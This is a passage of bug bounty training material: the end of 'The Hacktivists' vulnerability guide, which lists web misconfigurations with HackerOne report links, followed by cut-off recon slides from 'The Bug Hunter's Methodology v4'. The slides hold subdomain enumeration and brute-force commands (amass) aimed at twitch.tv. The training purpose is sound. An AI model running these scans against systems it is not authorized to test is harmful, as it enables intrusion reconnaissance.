notice that it has been changed to a phishing site, especially it the site looks the same as the target. 
 
Hackerone Reports : 
-
https://hackerone.com/reports/220737 
https://hackerone.com/reports/306414  
 
Source : ​https://www.owasp.org/index.php/Reverse_Tabnabbing  
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
12 
 
Server Security Misconfiguration  - Essential Guideline 
------------------------------------------------------------------------------- 
Improper server or web application configuration leading to various flaws Debugging enabled, Incorrect 
folder permissions, Using default accounts or passwords, Setup/Configuration pages enabled. Current web 
app security architectures do not follow security by default. On the contrary, programmers must apply 
security measures to avoid access to private or confidential resources.  
 
Source : ​https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration  
 
Using Default Credentials 
…………………………………………………………….. 
These default username and password combinations are widely known by penetration testers and malicious 
attackers, who can use them to gain access to various types of custom, open source, or commercial 
applications.  
 
Hackerone Reports : 
-
https://hackerone.com/reports/192074 
https://hackerone.com/reports/174883  
-
https://hackerone.com/reports/398797  
 
Source : ​https://www.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)  
https://www.owasp.org/index.php/Testing_for_Default_or_Guessable_User_Account_(OWASP-AT-003)  
 
Misconfigured DNS 
…………………………………………………………….. 
Subdomain Takeover 
Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a 
service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a 
page on the service that was being used and point their page to that subdomain.  
 
For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their 
GitHub page, an attacker can now create a GitHub page, add a CNAME file containing 
subdomain.example.com, and claim subdomain.example.com.  
 
-
https://hackerone.com/reports/294201 
https://hackerone.com/reports/202767  
 
Source : ​https://0xpatrik.com/takeover-proofs/  
Source : ​https://0xpatrik.com/subdomain-takeover-basics/  
Source : ​https://www.hackerone.com/blog/Guide-Subdomain-Takeovers  
 
OAuth Misconfiguration 
…………………………………………………………….. 
OAuth is an open standard for authorization, commonly used as a way for Internet users to log in to third 
party websites using their Microsoft, Google, Facebook, Twitter, One Network etc. accounts without exposing 
their password. 
 
The Hacktivists 
13 
 
Account  Takeover 
 
Hackerone Reports :  
-
https://hackerone.com/reports/131202 
https://hackerone.com/reports/3930  
 
Insecure Redirect URI 
 
Hackerone Reports :  ​https://hackerone.com/reports/270028  
 
Mail Server Misconfiguration 
…………………………………………………………….. 
Missing SPF records are a common and long-standing security issue that puts sensitive information at risk. 
We found that less than half of those domains have configured email authentication correctly to prevent 
spoofed emails being sent from their domains, which means that users are at risk of receiving false emails 
appearing to come from domains that they trust.  
 
Source : ​https://blog.detectify.com/2016/06/20/misconfigured-email-servers-open-the-door-to-spoofed-emails-from-top-domains/  
 
Missing  SPF on Email Domain 
 
-
https://hackerone.com/reports/324372
https://hackerone.com/reports/57736  
 
Missing SPF on Non-Email Domain 
 
-
https://hackerone.com/reports/92740 
https://hackerone.com/reports/54779  
-
https://hackerone.com/reports/325734  
 
Database Management System (DBMS) Misconfiguration 
…………………………………………………………….. 
The database typically contains the crown jewels of any environment; it usually holds the most business 
sensitive information which is why it is a high priority target for any attacker.  
 
Hackerone Reports :  
-
https://hackerone.com/reports/200818 
https://hackerone.com/reports/179751  
-
https://hackerone.com/reports/198292 
https://hackerone.com/reports/23098  
 
Source : ​https://a-lign.com/common-database-vulnerabilities-and-misconfigurations  
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2014/july/top-10-common-database-security-issues/  
 
Lack of Password Confirmation 
…………………………………………………………….. 
 
Delete Account 
Hackerone Reports :  ​https://hackerone.com/reports/42403  
 
The Hacktivists 
14 
 
Change Email Address 
Hackerone Reports :  ​https://hackerone.com/reports/245334  
 
Change Password 
Hackerone Reports :  ​https://hackerone.com/reports/546   
 
No Rate Limiting on Form 
…………………………………………………………….. 
 
Registration​    Hackerone Reports :  ​https://hackerone.com/reports/275186  
 
Login​       ​https://hackerone.com/reports/280389 
https://hackerone.com/reports/138863  
 
Email-Triggering 
 
-
https://hackerone.com/reports/224927 
https://hackerone.com/reports/280534  
-
https://hackerone.com/reports/170310  
 
Directory Listing Enabled 
…………………………………………………………….. 
The web server is configured to display the list of files contained in this directory. This is not recommended 
because the directory may contain files that are not normally exposed through links on the web site. 
 
Source : ​https://cwe.mitre.org/data/definitions/548.html  
 
Sensitive Data Exposure  
An attacker can see the files located in the directory and could potentially access files which disclose 
sensitive information. Like attacker access system enabled directory.  
 
-
https://hackerone.com/reports/110655 
https://hackerone.com/reports/223384  
-
https://hackerone.com/reports/175760  
 
Non-Sensitive Data Exposure​   Hackerone Reports : 
https://hackerone.com/reports/371464  
 
Same-Site Scripting 
…………………………………………………………….. 
Hello, I'd like to document what appears to be a common named misconfiguration that can result in a minor 
security issue with web applications.  
 
It's a common and sensible practice to install records of the form "​localhost. IN A 127.0.0.1​" into nameserver 
configurations, bizarrely however, administrators often mistakenly drop the trailing dot, introducing an 
interesting variation of Cross-Site Scripting (XSS) I call Same-Site Scripting.  
 
The Hacktivists 
15 
 
The missing dot indicates that the record is not fully qualified, and thus queries of the form 
"​localhost.example.com​" are resolved. While superficially this may appear to be harmless, it does in fact allow 
an attacker to cheat the RFC2109 (HTTP State Management Mechanism) same origin restrictions, and 
therefore hijack state management data. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/1509 
https://hackerone.com/reports/7085  
-
https://hackerone.com/reports/7949  
 
Source : ​https://www.securityfocus.com/archive/1/486606  
Source : ​https://www.soom.cz/clanky/1158--Same-Site-Scripting-SSS  
 
Unsafe File Upload 
…………………………………………………………….. 
Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. 
This is especially true for .asp and .php extensions uploaded to web servers because these file types are often 
treated as automatically executable, even when file system permissions do not specify execution. For 
example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP 
programs may be executed by the web server without directly invoking them on the operating system.  
 
Source : ​https://resources.infosecinstitute.com/file-upload-vulnerabilities/  
Source : ​https://www.owasp.org/index.php/Test_Upload_of_Malicious_Files_(OTG-BUSLOGIC-009)  
 
File Extension Filter Bypass | No Antivirus 
 
Hackerone Reports :  
-
https://hackerone.com/reports/305237 
https://hackerone.com/reports/27704  
-
https://hackerone.com/reports/713  
 
No Size Limit 
 
-
https://hackerone.com/reports/390 
https://hackerone.com/reports/263109  
-
https://hackerone.com/reports/127995  
 
Exposed Admin Portal - To Internet 
…………………………………………………………….. 
Do not enable access to your management interface from the internet or from other untrusted zones inside 
your enterprise security boundary. This applies whether you use the dedicated management port (MGT) or 
you configured a data port as your management interface.  
 
Hackerone Reports : ​https://hackerone.com/reports/297339  
 
Source : ​https://resources.infosecinstitute.com/dangers-web-management/  
https://www.owasp.org/index.php/Enumerate_Infrastructure_and_Application_Admin_Interfaces_(OTG-CONFIG-005)  
 
 
The Hacktivists 
16 
 
Lack of Security Headers 
…………………………………………………………….. 
Whenever a browser requests a page from a web server, the server responds with the content along with 
HTTP Response Headers. Some of these headers contain content meta data such as the content-encoding, 
cache-control, status error codes, etc.  
 
In many cases they are very easy to implement and only require a slight web server configuration change. 
HTTP security headers provide yet another layer of security by helping to mitigate attacks and security 
vulnerabilities.  
 
Source : ​https://geekflare.com/http-header-implementation/  
Source : ​https://www.keycdn.com/blog/http-security-headers  
Source : ​https://www.thesslstore.com/blog/http-security-headers   
-
 
Content-Security-Policy ​|​ X-Content-Security-Policy ​|​ X-Webkit-CSP 
The content-security-policy HTTP header provides an additional layer of security. This policy helps prevent 
attacks such as Cross Site Scripting (XSS) and other code injection attacks by defining content sources which 
are approved and thus allowing the browser to load them. 
 
Example : ​content-security-policy: script-src 'self' ​https://www.google-analytics.com  
 
Source : ​https://www.keycdn.com/support/content-security-policy  
Source : ​https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy  
 
X-XSS-Protection 
The x-xss-protection header is designed to enable the cross-site scripting (XSS) filter built into modern web 
browsers. This is usually enabled by default, but using it will enforce it. It is supported by Internet Explorer 
8+, Chrome, and Safari. Here is an example of what the header looks like. 
 
Example : ​x-xss-protection: 1; mode=block  
 
X-Frame-Options 
The x-frame-options header provides clickjacking protection by not allowing iframes to load on your site.  It is 
supported by IE 8+, Chrome 4.1+, Firefox 3.6.9+, Opera 10.5+, Safari 4+. Here is an example of what the header 
looks like.  
 
Example : ​x-frame-options: SAMEORIGIN  
 
Public-Key-Pins 
The public-key-pins header tells the web browser to associate a public key with a certain web server to 
prevent MITM attacks using rogue and forged X.509 certificates. This protects users in case a certificate 
authority is compromised.  Here is an example of what the header looks like. 
 
Example : ​public-key-pins: pin-sha256="t/OMbKSZLWdYUDmhOyUzS+ptUbrdVgb6Tv2R+EMLxJM="; 
pin-sha256="PvQGL6PvKOp6Nk3Y9B7npcpeL40twdPwZ4kA2IiixqA="; pin-sha256="ZyZ2XrPkTuoiLk/BR5FseiIV/diN3eWnSewbAIUMcn8="; 
pin-sha256="0kDINA/6eVxlkns5z2zWv2/vHhxGne/W0Sau/ypt3HY="; pin-sha256="ktYQT9vxVN4834AQmuFcGlSysT1ZJAxg+8N1NkNG/N8="; 
pin-sha256="rwsQi0+82AErp+MzGE7UliKxbmJ54lR/oPheQFZURy8="; max-age=600; report-uri="​https://www.keycdn.com​"  
Source : ​https://scotthelme.co.uk/hpkp-http-public-key-pinning/  
The Hacktivists 
17 
 
 
X-Content-Type-Options 
The x-content-type header prevents Internet Explorer and Google Chrome from sniffing a response away 
from the declared content-type. This helps reduce the danger of drive-by downloads and helps treat the 
content the right way. Here is an example of what the header looks like.  
 
Example : ​x-content-type-options: nosniff  
 
Strict-Transport-Security 
The strict-transport-security header is a security enhancement that restricts web browsers to access web 
servers solely over HTTPS. This ensures the connection cannot be establish through an insecure HTTP 
connection which could be susceptible to attacks.  
 
Example : ​strict-transport-security: max-age=31536000; includeSubDomains; preload  
 
Source : ​https://caniuse.com/#search=hsts  
Source : ​https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security  
 
Cache-Control for a Non-Sensitive Page 
 
Content-Security-Policy-Report-Only 
 
Example : ​Content-Security-Policy-Report-Only: default-src https:; report-uri /csp-violation-report-endpoint/  
 
Source : ​https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only  
 
Path Traversal 
…………………………………………………………….. 
 
SSL Attack (BREACH, POODLE etc.) 
…………………………………………………………….. 
All systems and applications utilizing the Secure Socket Layer (SSL) 3.0 with cipher-block chaining (CBC) 
mode ciphers may be vulnerable. However, the POODLE (Padding Oracle On Downgraded Legacy Encryption) 
attack demonstrates this vulnerability using web browsers and web servers, which is one of the most likely 
exploitation scenarios. Some Transport Layer Security implementations are also vulnerable to the attack. 
 
Source : ​https://www.gracefulsecurity.com/tls-ssl-vulnerabilities/  
Source : ​https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/  
 
Rate Limit Brute Forcing OTP Vulnerability 
………………………………………………………………... 
Source :  
https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Brute_Force_(Generic)_/_Insufficient_Anti-automation  
 
 
The Hacktivists 
18 
 
Logical Bugs | Vulnerabilities 
…………………………………………… 
Hackerone Reports :  
-
https://hackerone.com/reports/165727 
https://hackerone.com/reports/165727  
 
Source :  
https://medium.com/bugbountywriteup/bugbounty-i-dont-need-your-current-password-to-login-into-your-account-how-could-i-e51a945b083d  
 
 
Same Site Scripting 
……………………………………………………………………………………………………. 
It's a common and sensible practice to install records of the form "localhost. IN A 127.0.0.1" into nameserver. 
administrators often mistakenly drop the trailing dot. The missing dot indicates that the record is not fully 
qualified, and thus queries of the form "localhost.example.com" are resolved.  
 
While superficially this may appear to be harmless, it does in fact allow an attacker to cheat the RFC2109 
(HTTP State Management Mechanism) same origin restrictions, and therefore hijack state management data. 
 
Hackerone Reports : ​https://hackerone.com/reports/1509  
 
Source : ​https://seclists.org/bugtraq/2008/Jan/270  
 
Missing Certification Authority Authorization (CAA) Record 
……………………………………………………………………………………………………. 
DNS Certification Authority Authorization (CAA) is an Internet security policy mechanism which allows 
domain name holders to indicate to certificate authorities whether they are authorized to issue digital 
certificates for a particular domain name. It does this by means of a new "CAA" Domain Name System (DNS) 
resource record. 
 
Practical | How to test :  
-
https://caatest.co.uk  
-
https://dns.google.com  
 
Hackerone Reports : ​https://hackerone.com/reports/261706  
 
Source : ​https://www.ssl.com/article/certification-authority-authorization-caa  
Source : ​https://www.globalsign.com/en-in/blog/what-is-certificate-authority-authorization-checking  
 
 
Email Spoofing to Spam Folder 
……………………………………………………………………………………………………. 
Misconfigured email servers open the door to spoofed emails from top domains  
 
Hackerone Reports : ​https://hackerone.com/reports/263508  
 
Source : ​https://support.google.com/a/answer/7490901?hl=en  
The Hacktivists 
19 
 
 
Missing or Misconfigured SPF and/or DKIM 
……………………………………………………………………………………………………. 
DMARC – Domain-based Message Authentication, Reporting and Conformance is a technology that uses the 
resources of DNS and email servers to help avoid email abuse—specifically, phishing. It is layered over two 
technologies (SPF and DKIM) that allow for the specification of policies for incoming email. Publishing a 
DMARC record is one of the Requirements;   
 
SPF – Sender Policy Framework is a technology that allows an administrator to publish information about 
legitimate sending hosts in a specially formatted DNS resource record; 
 
DKIM – DomainKeys Identified Mail is a technology that allows a mail receiver to check that incoming mail 
from a domain is authorized by that domain’s administrators and that the email has not been changed as it 
has gone through the network. 
 
Practical | How to test :  
-
https://www.dmarcanalyzer.com/spf/checker 
-
https://www.dmarcanalyzer.com/dkim/dkim-check 
-
https://www.dmarcanalyzer.com/dmarc/dmarc-record-check  
 
Hackerone Reports : ​https://hackerone.com/reports/60260  
 
Source : ​https://geekflare.com/fix-email-spoofing-missing-spf-record-vulnerability  
Source : ​https://blog.detectify.com/2016/06/20/misconfigured-email-servers-open-the-door-to-spoofed-emails-from-top-domains/  
 
 
Session Cookie Scoped to Parent Domain 
……………………………………………………………………………………………………. 
This session cookie is scoped to the parent domain instead of a sub-domain. If a cookie is scoped to a parent 
domain, then this cookie will be accessible by the parent domain and also by any other sub-domains of the 
parent domain. This could lead to security problems.  
 
Source : ​https://portswigger.net/kb/issues/00500300_cookie-scoped-to-parent-domain  
 
 
Missing Secure or HTTPOnly Cookie Flag 
……………………………………………………………………………………………………. 
If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side 
JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to 
exploit by preventing them from trivially capturing the cookie's value via an injected script. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/75357 
https://hackerone.com/reports/58679  
 
Source : ​https://resources.infosecinstitute.com/securing-cookies-httponly-secure-flags  
 
The Hacktivists 
20 
 
CAPTCHA ByPass Vulnerability 
……………………………………………………………………………………………………. 
CAPTCHA ("Completely Automated Public Turing test to tell Computers and Humans Apart") is a type of 
challenge-response test used by many web applications to ensure that the response is not generated by a 
computer. CAPTCHA implementations are often vulnerable to various kinds of attacks even if the generated 
CAPTCHA is unbreakable.  
 
Hackerone Reports :  
-
https://hackerone.com/reports/210417 
https://hackerone.com/reports/246801  
 
Source : ​https://www.owasp.org/index.php/Testing_for_Captcha_(OWASP-AT-008)  
Source : ​https://www.owasp.org/index.php/Testing_for_Captcha_(OWASP-AT-012)  
 
 
Exposed Admin Portal | IP Address Disclosure 
……………………………………………………………………………………………………. 
Administrator interfaces may be present in the application or on the application server to allow certain users 
to undertake privileged activities on the site. Tests should be undertaken to reveal if and how this privileged 
functionality can be accessed by an unauthorized or standard user.  
 
Hackerone Reports :  
-
https://hackerone.com/reports/128114 
https://hackerone.com/reports/329791  
 
Source : ​https://www.owasp.org/index.php/Enumerate_Infrastructure_and_Application_Admin_Interfaces_(OTG-CONFIG-005)  
 
Missing DNSSEC 
……………………………………………………………………………………………………. 
DNSSEC is a cryptographic security extension to the DNS protocol. The Domain Name System (DNS) translates 
domain names into IP addresses (and vice versa). If, say, you want to visit example.com, your computer (the 
client) has to ask a name server for the IP address of example.nl's web server, which will be something like 
192.0.2.36 (IPv4) or 2001:db8::2:14 (IPv6).  
 
E-mail and other internet protocols use the same system. With DNSSEC, a digital signature is attached to the 
DNS information (records) that the server sends to the client, so that the client can check their authenticity. 
 
Practical | How to test :  
-
http://dnsviz.net  
-
https://en.internet.nl 
-
https://dnssec-analyzer.verisignlabs.com 
 
Hackerone Reports :  ​https://hackerone.com/reports/169704  
 
Source : ​https://www.sidn.nl/faq/dnssec?language_id=2  
Source : ​https://www.internetsociety.org/deploy360/dnssec/tools 
 
 
The Hacktivists 
21 
 
Brute Force Username Enumeration 
……………………………………………………………………………………………………. 
User enumeration is when a malicious actor can use brute-force to either guess or confirm valid users in a 
system. User enumeration is often a web application vulnerability, though it can also be found in any system 
that requires user authentication. Two of the most common areas where user enumeration occurs are in a 
site's login page and its ‘Forgot Password' functionality. 
 
-
https://hackerone.com/reports/335427 
https://hackerone.com/reports/250457  
 
Source : ​https://blog.rapid7.com/2017/06/15/about-user-enumeration  
Source : ​https://www.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)  
 
 
Potentially Unsafe HTTP Method Enabled - OPTIONS | TRACE 
……………………………………………………………………………………………………. 
HTTP offers a number of methods that can be used to perform actions on the web server. Many of theses 
methods are designed to aid developers in deploying and testing HTTP applications. These HTTP methods can 
be used for nefarious purposes if the web server is misconfigured. Additionally, Cross Site Tracing (XST), a 
form of cross site scripting using the server's HTTP TRACE method, is examined. 
 
Hackerone Reports :  
-
https://hackerone.com/reports/119860 
https://hackerone.com/reports/191220  
 
Source : ​https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)  
Source : ​https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945  
 
Lack of Forward Secrecy 
……………………………………………………………………………………………………. 
Perfect Forward Secrecy is a feature of specific key agreement protocols that gives assurances your session 
keys will not be compromised even if the private key of the server is compromised. By generating a unique 
session key for every session a user initiates, even the compromise of a single session key will not affect any 
data other than that exchanged in the specific session protected by that particular key. Perfect Forward 
Secrecy represents a huge step forwards in protecting data on the transport layer and following on from 
Heartbleed, everyone using SSL/TLS should be looking to implement it. 
 
Forward secrecy further protects data on the transport layer of a network that uses common SSL/TLS 
protocols, including OpenSSL, which had previously been affected by the Heartbleed exploit. If forward 
secrecy is used, encrypted communications and sessions recorded in the past cannot be retrieved and 
decrypted should long-term secret keys or passwords be compromised in the future, even if the adversary 
actively interfered, for example via a man-in-the-middle attack. 
 
-
https://hackerone.com/reports/44294 
https://hackerone.com/reports/32570  
 
Practical | How to test : ​https://safeweb.norton.com/heartbleed  
 
Source : ​https://scotthelme.co.uk/perfect-forward-secrecy  
 
The Hacktivists 
22 
 
Insecure Cipher Suite 
……………………………………………………………………………………………………. 
A cipher suite is a combination of authentication, encryption and message authentication code (MAC) 
algorithms. All of which are used during the negotiation of security settings for a TLS/SSL connection as well 
as for the secure transfer of data. 
 
Practical | How to test :  
-
 
 
Hackerone Reports : 
-
 ​https://hackerone.com/reports/194761 
https://hackerone.com/reports/99157  
 
Source : ​https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening  
Source : ​https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
23 
 
 
 
 
 
 
 
 
 
 
 
 
The Hacktivists 
24 
 
 
B​ug Bounty Hunting | 
W​ebApp Pentest  
T​raining 
L​ive Websites ​Practice 
 
 
 
 
 
The Hacktivists 
25 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Download All The Hacktivists™ InfoSec Training Modules 
 
https://1drv.ms/f/s!Ah6mcJeP80hdgRcEE-HkUl45GL7_   
http://www.mediafire.com/folder/xxq1ttcg29hk9/The_Hacktivists™_Training_Program  
 
 
 
 
 
The Hacktivists 
26 
The Bug Hunter’s Methodology v4
Recon
Application
Analysis
TBHM v4
Recon
About Me
●
Father, husband, hacker, gamer, sometimes 
streamer.
●
28th on BC leaderboard
●
Twitter  | YouTube  |  Twitch
●
Currently Playing:
Project Tracking 
In many parts of the workshop we 
will need to keep track of 
site-hierarchy, tools output, 
interesting notes, etc.
I use mindmaps with Xmind but the 
same eﬀect can be achieved 
through a lot of diﬀerent programs. 
Mindmaps allow me to visualize 
large scope bug hunting targets and 
also allow me to break up 
methodology for in-depth bug 
hunting as well.
Mission
Wide Recon is the art of discovering as many assets related to a target as possible. 
Make sure your scope permits testing these sites.
Scope 
Domains
Acquisitions
ASN 
Enumeration
Subdomain 
Enumeration
Other
Vulns:
Subdomain Takeover
Buckets
Github leaks
Automation/Helper:
Interlace
Screenshotting
Frameworks
Reverse 
WHOIS
Port 
Analysis
Finding Seeds/Roots
Scope Domains (Bugcrowd)
Scope Domains (HackerOne)
Acquisitions (Crunchbase)
We want to continue to gather seed/root domains. Acquisitions are often a new way to expand our available 
assets if they are in scope. We can investigate a company’s acquisition on sites like https://crunchbase.com, 
wikipedia, and Google.
Acquisitions (Crunchbase)
Here we can possibly drill down into old dominans related to 
Revlo, ClipMine, Curse, and GoodGame.
Remember to do some Googling on these acquisitions to see if 
they are still owned by the parent company. Many times 
acquisitions will split back out or get sold to another company.
ASN Enumeration (bgp.he.net)
Autonomous System Numbers are given to large 
enough networks. These ASN’s will help us track 
down some semblance of an entity’s IT 
infrastructure. The most reliable way to get these 
is manually through Hurricane Electric’s free-form 
search:
●
http://bgp.he.net
Because of the advent of cloud infrastructure, 
ASNs aren't always a complete picture of a 
network. Rogue assets could exist on cloud 
environments like AWS and Azure. Here we can 
see several IP ranges.
ASN 
Enumeration 
(cmd line)
Some automation is available to get ASNs. One such tool is the ‘net’ switch 
of “Metabigor” by j3ssiejjj which will fetch ASN data from a keyword from 
bgp.he.net and asnlookup.com 
Another is “ASNLookup” by Yassine Aboukir which utilizes the maxmind.com 
dataset.
One problem with cmd line enumeration is that you could return records 
from another org on accident that contains the keyword ‘tesla’. 
https://twitter.com/j3ssiejjj
https://twitter.com/yassineaboukir
ASN Enumeration (with Amass)
For discovering more seed domains we 
want to scan the whole ASN with a port 
scanner and return any root domains 
we see in SSL certiﬁcates, etc.
We can do this with Amass intel
Amass is written by Jeﬀ Foley and the 
Amass team.
https://twitter.com/jeff_foley
https://twitter.com/owaspamass
Reverse WHOIS (with Whoxy.com)
Every website has some registration info on ﬁle 
with the registrars. Two key pieces of data we 
can use are Organization name and any emails 
in the WHOIS data. To do this you need access 
to a large WHOIS database. WHOXY.com is 
one such database. 
You can use whoxy.com in this fashion, after 
you register and your free API key:
●
http://api.whoxy.com/?key=APIkeyHERE
&reverse=whois&name=Twitch+Hostma
ster
Careful with reverse whois data as it is the least 
high ﬁdelity source of new root/seed domains. 
It might include many parked domains or 
redirects to out of scope assets.
Reverse WHOIS (with DOMLink)
DOMLink is a tool written by 
Vincent Yiu (@vysecurity) which 
will recursively query the 
WHOXY WHOIS API. It will start 
by querying our targets WHOIS 
record, then analyze all the data 
and look for other records 
which contain the organization 
name or are registered to 
emails in the record. It does this 
recursively until it ﬁnds no more 
records of match. 
https://twitter.com/vysecurity
Ad/Analytics 
Relationships 
(builtwith.com)
You can also glean related domains and 
subdomains by looking at a target’s 
ad/analytics tracker codes. Many sites use the 
same codes across all their domains. Google 
analytics and New Relic codes are the most 
common. We can look at these “relationships” 
via a site called BuiltWith. Builtwith also has a 
Chrome and Firefox extension to do this on the 
ﬂy.
●
https://builtwith.com/relationships/twitch
.tv
BuiltWith is also a tool we’ll use to proﬁle the 
technology stack of a target in later slides.
Google-Fu
You can Google the: 
●
Copyright text
●
Terms of service text
●
Privacy policy text
from a main target to glean related 
hosts on Google.
Shodan
Shodan is a tool that continuously spiders 
infrastructure on the internet. It is much 
more verbose than regular spiders. It 
captures response data, cert data, stack 
proﬁling data, and more. It requires 
registration.
Example:
https://www.shodan.io/search?query=twitch.tv
We can glean a valuable question: is 
twitch.amazon.eu relevant to our testing?
Finding Subdomains
Subdomain Enumeration
Subdomain 
Enumeration
Subdomain 
Scraping
Subdomain 
Bruteforce
Linked and JS 
Discovery
++
Linked and JS 
Discovery
Linked Discovery (with Burp Suite Pro)
Another way to to widen our scope is to 
examine all the links of our main target. 
We can do this using Burp Suite Pro.
We can visit a seed/root and recursively 
spider all the  links for a term with regex, 
examining those links... and their links, 
and so on... until we have found all sites 
that could be in our scope.
This is a hybrid technique that will ﬁnd 
both roots/seeds and subdomains.
1.
Turn oﬀ passive scanning
2.
Set forms auto to submit (if you’re feeling 
frisky)
3.
Set scope to advanced control and use 
“keyword” of target name (not a normal 
FQDN)
4.
Walk+browse main site, then spider all hosts 
recursively!
5.
Proﬁt
Linked 
Discovery 
(with Burp 
Suite Pro)
Burp after requesting 
one site:
Linked 
Discovery 
(with Burp 
Suite Pro)
Linked Discovery 
(with Burp Suite Pro)
After the 1st spider run we’ve now 
discovered a ton of linked URLs that 
belong to our project. 
Not only subdomains, but NEW 
seeds/roots (twtchapp.net, 
ext-twitch.tv, twitchsvc.net). 
We can also now spider these new 
hosts and repeat until we have Burp 
Spider fatigue.
Linked Discovery 
(with Burp Suite Pro)
Now that we have this data, how 
do we export it? 
Clumsily =(
1)
Select all hosts in the site tree
2)
In PRO ONLY right click the 
selected hosts
3)
Go to “Engagement Tools” -> 
“Analyze target”
4)
Save report as an html ﬁle
5)
Copy the hosts from the “Target” 
section 
Linked Discovery 
(with GoSpider or hakrawler)
Linked discovery really just counts on 
using a spider recursively. 
One of the most extensible spiders 
for general automation is GoSpider 
written by j3ssiejjj which can be used 
for many things and supports parsing 
js very well.
In addition hakrawler by hakluke has 
many parsing strategies that interest 
bug hunters.
Subdomain Enumeration  (with 
SubDomainizer)
Subdomainizer by Neeraj Edwards is a tool with three 
purposes in analyzing javascript. It will take a page and 
run
1.
Find subdomains referenced in js ﬁles
2.
Find cloud services referenced in js ﬁles
3.
Use the Shannon Entropy formula to ﬁnd potentially 
sensitive items in js ﬁles
It will take a single page and scan for js ﬁles to analyze.
If just looking for subdomains subscraper by 
Cillian-Collins might be better because it has recursion.
Subdomain Scraping
Subdomain Scraping Sources
The next set of tools scrape 
domain information from all 
sorts of projects that expose 
databases of URLs or 
domains. 
New sources are coming 
out all the time so the tools 
must evolve constantly.
This is only a small list of 
sources. Many more exist.
Security Sources
Certiﬁcate Sources
Infrastructure Sources
Search Sources 
Subdomain Scraping Example (Google)
1.
site:twitch.tv -www.twitch.tv
2.
site:twitch.tv -www.twitch.tv -watch.twitch.tv
3.
site:twitch.tv -www.twitch.tv -watch.twitch.tv -dev.twitch.tv
4.
...
Subdomain Scraping 
(Amass)
For scraping subdomain data there are two industry leading tools at 
the moment; Amass and Subﬁnder. They parse all the “sources” 
referenced in the previous slide, and more. 
Amass has the most sources, extensible output, bruteforcing, 
permutation scanning, and a ton of other modes to do additional 
analysis of attack surfaces. 
Subdomain 
Scraping 
(Amass)
Amass also correlates 
these scraped domains to 
ASNs and lists what 
network ranges they 
appeared in.
Useful.
If a new ASN is 
discovered you can feed 
it back to amass intel.
Subdomain 
Scraping 
(Subfinder v2)
Subﬁnder is another best in 
breed tool originally written by 
ice3man and Michael Skelton.
It is now maintained by a larger 
group, called projectdiscovery.io
It incorporates multiple sources, 
has extensible output, and more. 
Subdomain Scraping (github-subdomains.py)
A new addition to my subdomain enumeration is scraping Github. Github-subdomains.py is a script written by Gwendal Le Coguic 
as part of his EPIC Github enumeration repo called “github- search” It will query the Github API for references to a root and pull 
out subdomains.
Note: the Github API returns somewhat random results and is rate limited. In my automation I run 5 iterations of this script. Four 
of them with a six second sleep in between them, and the last with a 10 second sleep, to get some consistency.
Subdomain 
Scraping 
(shosubgo)
Another valuable bespoke scraping 
technique is gathering subdomains 
from Shodan. 
Shosubgo is a Go script written by 
inc0gbyt3 which is eﬀective and 
reliable for this method.
Subdomain Scraping (Cloud Ranges)
A highly valuable technique is to 
monitor whole cloud ranges of 
AWS, GCP, and Azure for SSL 
sites, and parse their certiﬁcates to 
match your target.
Doing this is cumbersome on your 
own but possible with something 
like masscan. Daehee Park 
outlines it here.
Luckily Sam Erb did a wonderful 
defcon talk on this and created a 
service which scans every week.
Some bash scripting required ;)
Subdomain 
Bruteforce
Subdomain Bruting
At this point we move into guessing for live subdomains. 
If we try and resolve
thistotallydoesntexist.company.com   we will *usually* not get a record.
So we can use a large list of common subdomain names and just try and resolve them 
analyzing if they succeed. 
The problem in this method is that only using one DNS server to do this will take forever. 
Some tools have come out that are both threaded and use multiple DNS resolvers 
simultaneously. This speeds up this process signiﬁcantly. Massdns by @blechschmidt  
pioneered this idea. 
Amass (8 revolvers by default) does this with the -rf ﬂag.
Subdomain Bruting (Amass)
Amass oﬀers bruteforcing via the 
“enum” tool using the “brute” switch. 
●
amass enum -brute -d twitch.tv -src
It has a built in list but you can specify your 
own lists. 
You can also specify any number of resolvers
●
amass enum -brute -d twitch.tv -rf 
resolvers.txt -w bruteforce.list
Doing this with amass also gives us the 
opportunity to resolve the found domains.
I haven’t checked out aisdnsbrute yet but i’ve 
heard it’s fast.
Subdomain Bruting (shuffleDNS)
If you like separating the work to diﬀerent tools or prefer the massdns core you can use 
shuﬄeDNS by the ProjectDiscovery team.
Subdomain Bruting Lists
A multi resolver, threaded subdomain bruter is only 
as good as it’s wordlist.
There are two trains of thought here:
●
Tailored wordlists
●
Massive wordlists
Both have advantages. 
My all.txt ﬁle is still what i use on a regular basis. It 
combines 7 years of DNS bruteforce lists into one.
But you can make customized wordlists with 
something like what TomNomNom talked on 
yesterday. 
I also think there was a tool for this recently...
Subdomain Bruting Lists
New lists for subdomain bruteforce are 
